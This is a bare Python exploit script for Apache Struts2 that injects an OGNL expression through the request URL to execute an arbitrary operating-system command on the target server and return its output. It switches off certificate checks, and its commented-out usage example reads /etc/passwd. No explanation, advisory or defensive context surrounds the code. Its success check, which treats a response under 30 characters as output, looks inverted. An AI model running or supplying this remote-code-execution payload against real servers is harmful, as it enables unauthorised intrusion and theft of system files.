import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys

def exploit(url, command):
    payload = '%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27' + command + '%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action'
    try:
        out = requests.get("https://" + url + "/" + payload, verify=False, timeout=(10, 27)).text
        i = 0
        for line in out.__str__():
            i = i + 1

        if i < 30:
            print(out)
        else:
            print("Struts Not Found")

    except Exception as e:
        print(e)    
    



# target = sys.argv[1]
# command = "cat /etc/passwd"
# exploit(target, command)